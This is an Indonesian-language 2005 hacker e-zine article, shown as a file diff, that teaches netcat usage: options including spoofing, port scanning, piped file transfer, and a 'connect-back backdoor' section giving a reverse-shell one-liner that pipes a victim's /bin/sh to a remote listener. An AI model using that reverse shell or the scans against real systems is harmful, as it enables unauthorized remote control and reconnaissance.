@@ -1,0 +1,233 @@
+HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
+HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH  HHHHHHHHHHHH HHHHHHHHHHHHHHHHHHHHHHHHHHHH
+HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH  HHHHHHHHHHHH HHHHHHHHHHHHHHHHHHHHHHHHHHHH
+HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH  HHHHHHHHHHHH HHHHHHHHHHHHHHHHHHHHHHHHHHHH
+HHHHHHHHHHHHHHHHHHHHH   HHHH   HHH  HHHHHH   HHH HHH      HH  HH  H HHHH   HH
+HHHHHHHHHHHHHHHHHHHH  H  HH  H  HH    HHH     HH HHHHHHH  HHHHHH     HH  H  H
+HHHHHHHHHHHHHHHHHHHH     HH  HHHHH  H  HH  H  HH HHHHHH  HHH  HH  H  HH     H
+HHHHHHHHHHHHHHHHHHHH  HHHHH  HHHHH  H  HH  H  HH HHHHH  HHHH  HH  H  HH  HHHH
+HHHHHHHHHHHHHHHHHHHH  H  HH  H  HH  H  HH  H  HH HHHH  HHHHH  HH  H  HH  H  H
+HHHHHHHHHHHHHHHHHHHHH   HHHH   HHH  H  HHH   HHH HHH      HH  HH  H  HHH   HH
+HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
+                                          echo|zine, Vol 3 Issue 11, 05-05-05
+
+
+
+------------|  Netcat: Network Swiss Army Knife
+               digital junkie <digital.junkie@fuckshitpussyfuck.com>
+
+
+
+------|  Intro
+
+
+Mengutip bagian HISTORY pada manual netcat[1] (sering disingkat sebagai nc)...
+
+   The nc utility, a "damn useful little backend utility" begun 950915 or
+   thereabouts, as *Hobbit*'s first real stab at some sockets programming.
+   Something that should have and indeed may have existed ten years ago, 
+   but never became a standard Unix utility.  IMHO, nc could take its place
+   right next to cat, cp, rm, mv, dd, ls, and all those other cryptic and
+   Unix-like things.
+
+Hackers dan administrators sepertinya senang sekali menggunakan tool ini
+untuk melakukan scanning, berkomunikasi dengan open ports, bahkan 
+melakukan transfer informasi atar host. 
+
+Untuk memperolehnya, Anda dapat mendownload netcat dari website 
+packetstormsecurity.org atau FTP mirror berikut...
+  * ftp://coast.cs.purdue.edu/pub/tools/unix/netutils/netcat/ 
+  * ftp://ftp.cuhk.edu.hk/pub/packages/security/purdue/netutils/netcat/
+
+Saya tidak akan membahas lebih lanjut mengenai bagaimana menginstal netcat
+pada sistem Anda karena ada banyak sekali manual yang tersebar di Internet
+tentang bagaimana mengkompail atau memperoleh binary netcat yang sesuai.
+Dan pada tulisan ini, saya mengkhususkan penggunaan netcat pada environment
+spesifik: UNIX.
+
+Secara sederhana, penggunaan netcat mirip dengan sebuah Telnet client, 
+karena netcat dapat mengakses remote host mana saja dengan port apa saja 
+(pada protokol TCP dan UDP). Sebagai contoh: untuk connect ke sebuah
+host bernama dubyadubya.org pada port 80, Anda cukup mengeksekusi 
+command:
+
+   $ nc dubyadubya.org 80
+
+Lalu tekan CTRL + C untuk exit. Jika port yang dituju terbuka, Anda dapat
+memberikan perintah yang Anda inginkan. Seperti:
+
+   $ nc dubyadubya.org 80
+   GET / HTTP/1.0                                 [ENTER]
+                                                  [ENTER]
+   HTTP/1.1 200 OK
+   Date: Sat, 30 Apr 2005 03:29:21 GMT
+   Server: Apache/1.3.33 (Darwin) PHP/4.3.10
+   Connection: close
+   Content-Type: text/html
+   ...
+
+
+Netcat juga dapat digunakan sebagai tool untuk melakukan testing sebuah
+firewall. Yang menjadi tujuan testing adalah mencari tahu ports yang 
+berstatus OPEN dan LISTENING.
+
+
+------|  Netcat Command Options
+
+
+Sebelum lebih jauh membahas contoh penggunaan netcat, ada baiknya jika
+kita membahas satu-per-satu option yang tersedia dari program tersebut.
+
+  -g gateway    Tentukan source routing hop untuk koneksi-koneksi
+                outbound.
+
+  -G number     Digunakan untuk memberikan spesifikasi source routing
+                pointer dalam IP header.. value: 4, 8, 12, ...
+
+  -i seconds    Menentukan delay interval pengiriman packets.
+                Sebagai contoh, jika Anda ingin netcat menunggu 5 detik
+                untuk scanning ports, gunakan -i 5
+
+  -l            Listen mode. Jika digunakan dengan options tambahan,
+                maka sangat dimungkinkan untuk melakukan binding ke
+                sebuah root shell.
+
+  -n            Tidak menggunakan DNS support dan hanya menggunakan
+                IP address saja. Sangat berguna jika DNS Anda seringkali
+                'lambat' dan 'bermasalah'.
+
+  -o file       Membuat format hex-dump traffic ke sebuah file.
+
+  -p value      Sebuah option untuk melakukan port spoofing. Jika Anda 
+                ingin sebuah packet tampak terkirim dari port 53 dari 
+                sebuah host, maka Anda akan menggunakan -p 53.
+
+  -r            Memungkinkan netcat untuk melakukan random scanning ports.
+
+  -s address    Melakukan spoofing source address dari packet. Option ini
+                tidak dapat bekerja pada semua sistem.
+
+  -u            Secara default, netcat menggunakan protokol TCP. Dengan 
+                menggunakan option ini, netcat akan menggunakan User
+                Datagram Protocol (UDP).
+
+  -v            Verbose mode. Gunakan -v -v untuk mendapatkan informasi
+                yang lebih banyak.
+
+  -w seconds    Membuat netcat menunggu (dalam detik) untuk setiap 
+                respon port. Option ini biasanya dikombinasikan dengan 
+                option -z
+
+  -z            Juga disebut "zero-I/O mode", option ini memungkinkan 
+                netcat tidak menggunakan I/O dari source system. Option 
+                ini biasanya digunakan ketika memanfaatkan netcat sebagai 
+                scanner.
+
+
+------|  Examples
+
+
+Secara sederhana, untuk melakukan koneksi ke remote host, gunakan
+
+   $ nc [-options] hostname port[s] [ports] ... 
+
+sedangkan untuk listen pada koneksi inbound, gunakan
+
+   $ nc -l -p port [-options] [hostname] [port]
+
+Sekarang, kita akan menggunakan netcat sebagai tool untuk melakukan
+pengecekan terhadap sebuah remote host. Jika Anda menginginkan 
+scanning pada port 1 sampai 1024, maka perintah yang diberikan adalah
+
+   $  nc -z -w 5 -n -v 234.56.78.9 1-1024
+   (UNKNOWN) [234.56.78.9] 631 (?) open
+   (UNKNOWN) [234.56.78.9] 113 (?) open
+   (UNKNOWN) [234.56.78.9] 80 (?) open
+   (UNKNOWN) [234.56.78.9] 25 (?) open
+
+Gunakan double verbose (-v -v) untuk mendapatkan informasi tentang 
+ports yang tertutup (refused)...
+
+   (UNKNOWN) [234.56.78.9] 5 (?) : Connection refused
+   (UNKNOWN) [234.56.78.9] 4 (?) : Connection refused
+   (UNKNOWN) [234.56.78.9] 3 (?) : Connection refused
+   (UNKNOWN) [234.56.78.9] 2 (?) : Connection refused
+   (UNKNOWN) [234.56.78.9] 1 (?) : Connection refused
+
+Option -z dan -w 5 digunakan agar netcat tidak melakukan binding sebuah
+port dan menunggu lima detik untuk setiap koneksi. Option -n digunakan
+untuk tidak memanfaatkan fitur DNS resolve.
+
+Untuk target ports, Anda dapat melakukan pembatasan hanya pada port 
+tertentu saja.
+
+   $ nc -z -w 5 -n -v 234.56.78.9 21-25, 53, 80, 110-113, 443
+
+Anda dapat melakukan scanning UDP ports dengan menambahkan option -u
+
+   $ nc -u -z -v -n 234.56.78.9 1-65335
+   (UNKNOWN) [234.56.78.9] 69 (?) open
+   (UNKNOWN) [234.56.78.9] 514 (?) open
+   (UNKNOWN) [234.56.78.9] 53 (?) open
+ 
+
+------|  Advanced Examples
+
+
+Pada penggunaan tingkat lanjut, netcat juga dapat digunakan sebagai
+tool untuk melakukan transfer file. Sebagai contoh: Anda ingin
+melakukan copy-transfer sebuah direktori dari host-A ke host-B .
+Maka yang perlu Anda lakukan adalah:
+
+  * pada host-A
+
+    $ tar cvf - direktori/ | nc host-B 12345
+
+  * pada host-B
+
+    $ nc -l -p 12345 | tar xvf -
+
+Anda juga dapat mengunakan netcat sebagai connect-back backdoor. :-)
+
+  * pada host-A, aktifkan 2 window dimana netcat dijalankan dengan
+    LISTEN mode.
+
+    $ nc -l -p 12345                               [ window-1 ]
+    $ nc -l -p 12346                               [ window-2 ]
+
+  * pada host-B (yang menjadi victim)
+
+    $ nc -v host-B 12345 | /bin/sh | nc -v host-B 12346
+
+Pada window-1 di host-A, Anda dapat mengetikkan perintah yang akan 
+dijalankan pada host-B, dan kemudian melihat output dari perintah
+yang diberikan pada window-2 di host-A. 
+ 
+
+------|  Penutup
+
+
+Netcat layaknya sebuah Swiss Army Knife, dapat menjadi tool yang sangat
+bermanfaat bagi mereka pada network administrator. Namun tool ini juga
+dapat menjadi boomerang jika dimanfaatkan oleh mereka yang punya niatan
+tidak baik pada resource yang kita miliki.
+
+
+
+------|  Referensi
+
+
+[1]   Hobbit, "nc (netcat) - use network sockets from the command 
+      line," Netcat Manual, 1995.
+
+
+------|  Greets
+
+
+Terimakasih kepada anonymous (echo|zine) dan negative untuk improvisasi
+Bahasa Indonesia dan all logic fixes.
+
+Greets to: anonymous, negative, hyponemesis, #naisenodni ppl.
+
+
+---|  EOF
